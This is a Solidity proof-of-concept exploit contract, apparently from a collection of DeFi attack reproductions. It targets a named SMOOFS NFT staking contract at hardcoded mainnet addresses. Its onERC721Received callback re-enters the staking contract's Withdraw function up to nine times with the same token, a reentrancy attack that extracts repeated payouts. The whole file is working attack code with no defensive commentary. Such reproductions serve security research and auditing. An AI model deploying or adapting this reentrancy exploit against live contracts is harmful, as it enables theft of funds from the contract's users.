// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../interface.sol";
import "hardhat/console.sol";

contract AttackSmoofsStaking {

    ISMOOFSStaking private constant SMOOFSStaking = ISMOOFSStaking(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C);
    IERC721 private constant Smoofs = IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
    IERC20 private constant MOOVE = IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
    address private constant attackContract = 0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;
    uint256 private constant smoofsTokenId = 2062;
    uint256 setCount;
    uint256 public decimal = 10 ** 18;

    function exploit() external {
        Smoofs.approve(address(SMOOFSStaking), smoofsTokenId);
        MOOVE.approve(address(SMOOFSStaking), type(uint256).max);

        SMOOFSStaking.Stake(smoofsTokenId);
        SMOOFSStaking.Withdraw(smoofsTokenId, true);
    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {

        while (setCount < 9) {
            console.log("Reentrant time: ", setCount);
            ++setCount;
            MOOVE.approve(address(SMOOFSStaking), type(uint256).max);
            Smoofs.safeTransferFrom(address(this), address(SMOOFSStaking), smoofsTokenId);
            SMOOFSStaking.Withdraw(smoofsTokenId, true);


        }

        return this.onERC721Received.selector;

    }

}

interface ISMOOFSStaking {
    function Stake(uint256 _tokenId) external;

    function Withdraw(uint256 _tokenId, bool forceWithTax) external;
}